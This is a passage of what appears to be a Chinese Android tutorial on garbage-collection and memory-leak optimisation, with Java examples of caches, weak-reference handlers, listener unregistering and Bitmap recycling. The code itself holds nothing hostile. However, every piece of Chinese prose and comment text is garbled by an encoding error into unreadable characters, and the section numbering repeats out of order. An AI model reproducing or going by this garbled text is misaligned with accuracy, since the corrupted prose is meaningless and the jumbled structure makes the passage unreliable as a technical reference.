<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> sb.toString();
</code></pre>
<p><strong>ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šä½¿ç”¨åŒ…è£…ç±»å‹</span>
List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(i));  <span class="hljs-comment">// åˆ›å»ºIntegerå¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨åŸºæœ¬ç±»å‹æ•°ç»„</span>
<span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    array[i] = i;  <span class="hljs-comment">// ä¸åˆ›å»ºå¯¹è±¡</span>
}
</code></pre>
<h5 data-id="heading-40">4.2.2 åˆç†ä½¿ç”¨ç¼“å­˜</h5>
<p><strong>é¿å…å†…å­˜æ³„æ¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæ— é™åˆ¶ç¼“å­˜</span>
<span class="hljs-keyword">private</span> Map&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(String key, Bitmap bitmap)</span> {
    cache.put(key, bitmap);  <span class="hljs-comment">// å¯èƒ½æ— é™å¢é•¿</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨LruCache</span>
<span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(String key, Bitmap bitmap)</span> {
    cache.put(key, bitmap);  <span class="hljs-comment">// è‡ªåŠ¨é™åˆ¶å¤§å°</span>
}
</code></pre>
<p><strong>åŠæ—¶æ¸…ç†ä¸å†ä½¿ç”¨çš„ç¼“å­˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-comment">// æ¸…ç†ç¼“å­˜</span>
    cache.clear();
}
</code></pre>
<h5 data-id="heading-41">4.2.3 ä¼˜åŒ–æ•°æ®ç»“æ„</h5>
<p><strong>é€‰æ‹©åˆé€‚çš„é›†åˆç±»ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¦‚æœéœ€è¦éšæœºè®¿é—®ï¼Œç”¨ArrayList</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">// éšæœºè®¿é—®å¿«</span>

<span class="hljs-comment">// å¦‚æœéœ€è¦é¢‘ç¹æ’å…¥åˆ é™¤ï¼Œç”¨LinkedList</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();  <span class="hljs-comment">// æ’å…¥åˆ é™¤å¿«</span>
</code></pre>
<p><strong>é¿å…å†…å­˜æµªè´¹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šä¸æ¸…ç†é›†åˆ</span>
List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-comment">// ... ä½¿ç”¨list</span>
<span class="hljs-comment">// listä¸å†ä½¿ç”¨ï¼Œä½†æ²¡æœ‰æ¸…ç†</span>

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶æ¸…ç†</span>
list.clear();
list = <span class="hljs-literal">null</span>;
</code></pre>
<h5 data-id="heading-42">4.2.4 é¿å…å†…å­˜æ³„æ¼</h5>
<p><strong>æ­£ç¡®å¤„ç†ç”Ÿå‘½å‘¨æœŸï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> Handler handler;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandler</span>(<span class="hljs-built_in">this</span>);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onDestroy();
        <span class="hljs-comment">// æ¸…ç†Handlerï¼Œé¿å…å†…å­˜æ³„æ¼</span>
        handler.removeCallbacksAndMessages(<span class="hljs-literal">null</span>);
        handler = <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>é¿å…æŒæœ‰Activity/Contextçš„å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šé™æ€å˜é‡æŒæœ‰Activity</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;  <span class="hljs-comment">// å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼</span>

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨Application Context</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Context appContext;  <span class="hljs-comment">// ä½¿ç”¨Application Context</span>
</code></pre>
<p><strong>ä½¿ç”¨å¼±å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨å¼±å¼•ç”¨é¿å…å†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyHandler(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
}
</code></pre>
<h4 data-id="heading-43">4.3 GCä¼˜åŒ–å®è·µåœºæ™¯</h4>
<h5 data-id="heading-44">4.3.1 åˆ—è¡¨æ»‘åŠ¨ä¼˜åŒ–</h5>
<p><strong>RecyclerViewçš„ViewHolderå¤ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.Adapter&lt;MyAdapter.ViewHolder&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ViewHolder <span class="hljs-title function_">onCreateViewHolder</span><span class="hljs-params">(ViewGroup parent, <span class="hljs-type">int</span> viewType)</span> {
        <span class="hljs-comment">// ViewHolderå¤ç”¨ï¼Œé¿å…é¢‘ç¹åˆ›å»º</span>
        <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> LayoutInflater.from(parent.getContext())
            .inflate(R.layout.item, parent, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewHolder</span>(view);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
        <span class="hljs-comment">// é¿å…åœ¨è¿™é‡Œåˆ›å»ºæ–°å¯¹è±¡</span>
        <span class="hljs-comment">// å¤ç”¨ViewHolderä¸­çš„View</span>
    }
}
</code></pre>
<p><strong>é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºæ–°å¯¹è±¡ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Item "</span> + position));  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-string">"Item "</span> + position);  <span class="hljs-comment">// å¤ç”¨å­—ç¬¦ä¸²</span>
}
</code></pre>
<h5 data-id="heading-45">4.3.2 åŠ¨ç”»æ€§èƒ½ä¼˜åŒ–</h5>
<p><strong>å¤ç”¨åŠ¨ç”»å¯¹è±¡ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæ¯æ¬¡åˆ›å»ºæ–°åŠ¨ç”»</span>
button.setOnClickListener(v -&gt; {
    <span class="hljs-type">ObjectAnimator</span> <span class="hljs-variable">animator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectAnimator</span>();  <span class="hljs-comment">// æ¯æ¬¡éƒ½åˆ›å»º</span>
    animator.start();
});

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šå¤ç”¨åŠ¨ç”»å¯¹è±¡</span>
<span class="hljs-keyword">private</span> ObjectAnimator animator;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
    <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
    animator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectAnimator</span>();
}

button.setOnClickListener(v -&gt; {
    animator.start();  <span class="hljs-comment">// å¤ç”¨</span>
});
</code></pre>
<h5 data-id="heading-46">4.3.3 å›¾ç‰‡åŠ è½½ä¼˜åŒ–</h5>
<p><strong>ä½¿ç”¨å›¾ç‰‡ç¼“å­˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨Glideç­‰åº“ï¼Œè‡ªåŠ¨ç¼“å­˜</span>
Glide.with(context)
    .load(url)
    .into(imageView);
</code></pre>
<p><strong>åŠæ—¶é‡Šæ”¾ä¸ç”¨çš„Bitmapï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-keyword">if</span> (bitmap != <span class="hljs-literal">null</span>) {
        bitmap.recycle();
        bitmap = <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>é¿å…åŠ è½½è¿‡å¤§çš„å›¾ç‰‡ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åŠ è½½æ—¶å‹ç¼©å›¾ç‰‡</span>
BitmapFactory.<span class="hljs-type">Options</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BitmapFactory</span>.Options();
options.inSampleSize = <span class="hljs-number">2</span>;  <span class="hljs-comment">// å‹ç¼©2å€</span>
<span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> BitmapFactory.decodeFile(path, options);
</code></pre>
<h5 data-id="heading-47">4.3.4 å¤§å¯¹è±¡å¤„ç†ä¼˜åŒ–</h5>
<p><strong>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Bitmap largeBitmap;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadImage</span><span class="hljs-params">()</span> {
    largeBitmap = loadLargeBitmap();
    <span class="hljs-comment">// ä½¿ç”¨å®ŒååŠæ—¶é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (largeBitmap != <span class="hljs-literal">null</span>) {
        largeBitmap.recycle();
        largeBitmap = <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h4 data-id="heading-48">4.2 å†…å­˜æ³„æ¼ï¼ˆMemory Leakï¼‰</h4>
<h4 data-id="heading-49">4.2.1 ä»€ä¹ˆæ˜¯å†…å­˜æ³„æ¼</h4>
<p><strong>å®šä¹‰ï¼š</strong> å¯¹è±¡å·²ç»ä¸å†ä½¿ç”¨ï¼Œä½†å› ä¸ºè¢«å¼•ç”¨æ— æ³•è¢«GCå›æ”¶ï¼Œå¯¼è‡´å†…å­˜æµªè´¹</p>
<p><strong>ä¸å†…å­˜æº¢å‡ºçš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li><strong>å†…å­˜æº¢å‡º</strong>ï¼šå†…å­˜çœŸçš„ä¸å¤Ÿç”¨äº†ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡</li>
</ul>
<p><strong>å±å®³ï¼š</strong></p>
<ul>
<li>å†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</li>
<li>åº”ç”¨å˜æ…¢ï¼Œå¯èƒ½è¢«ç³»ç»Ÿæ€æ­»</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å†…å­˜æ³„æ¼ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryLeak</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(Object obj)</span> {
        cache.add(obj);  <span class="hljs-comment">// å¯¹è±¡è¢«cacheå¼•ç”¨ï¼Œæ— æ³•å›æ”¶</span>
        <span class="hljs-comment">// å³ä½¿objä¸å†ä½¿ç”¨ï¼Œä¹Ÿæ— æ³•è¢«GCå›æ”¶</span>
    }
}
</code></pre>
<h4 data-id="heading-50">4.2.2 Androidä¸­å¸¸è§çš„å†…å­˜æ³„æ¼åœºæ™¯</h4>
<h5 data-id="heading-51">4.2.2.1 Activity/Contextæ³„æ¼</h5>
<p><strong>é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;  <span class="hljs-comment">// é™æ€å˜é‡æŒæœ‰Activity</span>
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        activity = <span class="hljs-built_in">this</span>;  <span class="hljs-comment">// Activityæ— æ³•è¢«å›æ”¶</span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨å¼±å¼•ç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> WeakReference&lt;Activity&gt; activityRef;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(<span class="hljs-built_in">this</span>);
    }
}
</code></pre>
<p><strong>å•ä¾‹æŒæœ‰Contextå¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæŒæœ‰Activity Context</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySingleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> MySingleton instance;
    <span class="hljs-keyword">private</span> Context context;
    
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">MySingleton</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-built_in">this</span>.context = context;  <span class="hljs-comment">// å¦‚æœæ˜¯Activity Contextï¼Œä¼šæ³„æ¼</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MySingleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySingleton</span>(context);
        }
        <span class="hljs-keyword">return</span> instance;
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨Application Context</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySingleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> MySingleton instance;
    <span class="hljs-keyword">private</span> Context context;
    
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">MySingleton</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-built_in">this</span>.context = context.getApplicationContext();  <span class="hljs-comment">// ä½¿ç”¨Application Context</span>
    }
}
</code></pre>
<p><strong>å†…éƒ¨ç±»æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šHandlerå†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
            <span class="hljs-comment">// HandleræŒæœ‰Activityå¼•ç”¨</span>
        }
    };
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨é™æ€å†…éƒ¨ç±»+å¼±å¼•ç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
        <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
        
        MyHandler(Activity activity) {
            activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(Message msg)</span> {
            <span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> activityRef.get();
            <span class="hljs-keyword">if</span> (activity != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// ä½¿ç”¨activity</span>
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-52">4.2.2.2 ç›‘å¬å™¨æ³„æ¼</h5>
<p><strong>EventBusæœªå–æ¶ˆæ³¨å†Œï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¿˜è®°å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        EventBus.getDefault().register(<span class="hljs-built_in">this</span>);  <span class="hljs-comment">// æ³¨å†Œ</span>
        <span class="hljs-comment">// å¿˜è®°å–æ¶ˆæ³¨å†Œï¼ŒEventBusæŒæœ‰Activityå¼•ç”¨ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåœ¨onDestroyä¸­å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    EventBus.getDefault().unregister(<span class="hljs-built_in">this</span>);  <span class="hljs-comment">// å–æ¶ˆæ³¨å†Œ</span>
}
</code></pre>
<p><strong>å¹¿æ’­æ¥æ”¶å™¨æœªå–æ¶ˆæ³¨å†Œï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¿˜è®°å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">BroadcastReceiver</span> <span class="hljs-variable">receiver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BroadcastReceiver</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> {
            <span class="hljs-comment">// å¤„ç†å¹¿æ’­</span>
        }
    };
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        registerReceiver(receiver, <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntentFilter</span>(<span class="hljs-string">"ACTION"</span>));  <span class="hljs-comment">// æ³¨å†Œ</span>
        <span class="hljs-comment">// å¿˜è®°å–æ¶ˆæ³¨å†Œï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåœ¨onDestroyä¸­å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-keyword">if</span> (receiver != <span class="hljs-literal">null</span>) {
        unregisterReceiver(receiver);  <span class="hljs-comment">// å–æ¶ˆæ³¨å†Œ</span>
    }
}
</code></pre>
<p><strong>å…¶ä»–ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¿˜è®°å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        someView.setOnClickListener(listener);  <span class="hljs-comment">// æ³¨å†Œ</span>
        someObject.setOnDataChangedListener(listener);  <span class="hljs-comment">// æ³¨å†Œ</span>
        <span class="hljs-comment">// å¦‚æœè¿™äº›ç›‘å¬å™¨æŒæœ‰Activityå¼•ç”¨ï¼Œå¿˜è®°å–æ¶ˆæ³¨å†Œä¼šå¯¼è‡´æ³„æ¼</span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåœ¨onDestroyä¸­å–æ¶ˆæ³¨å†Œ</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    someView.setOnClickListener(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// å–æ¶ˆæ³¨å†Œ</span>
    someObject.setOnDataChangedListener(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// å–æ¶ˆæ³¨å†Œ</span>
}
</code></pre>
<h5 data-id="heading-53">4.2.2.3 é›†åˆç±»æ³„æ¼</h5>
<p><strong>é›†åˆä¸­ä¿å­˜äº†å¯¹è±¡ï¼Œä½†å¿˜è®°æ¸…ç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šé›†åˆæ³„æ¼</span>
<span class="hljs-keyword">private</span> List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addObject</span><span class="hljs-params">(Object obj)</span> {
    list.add(obj);  <span class="hljs-comment">// å¯¹è±¡è¢«listå¼•ç”¨</span>
    <span class="hljs-comment">// å³ä½¿objä¸å†ä½¿ç”¨ï¼Œä¹Ÿæ— æ³•è¢«å›æ”¶</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶æ¸…ç†</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObject</span><span class="hljs-params">(Object obj)</span> {
    list.remove(obj);
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    list.clear();  <span class="hljs-comment">// æ¸…ç†é›†åˆ</span>
}
</code></pre>
<h5 data-id="heading-54">4.2.2.4 çº¿ç¨‹æ³„æ¼</h5>
<p><strong>çº¿ç¨‹æŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œçº¿ç¨‹ä¸ç»“æŸï¼Œå¯¹è±¡æ— æ³•å›æ”¶ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šçº¿ç¨‹æ³„æ¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-keyword">private</span> Thread thread;
    
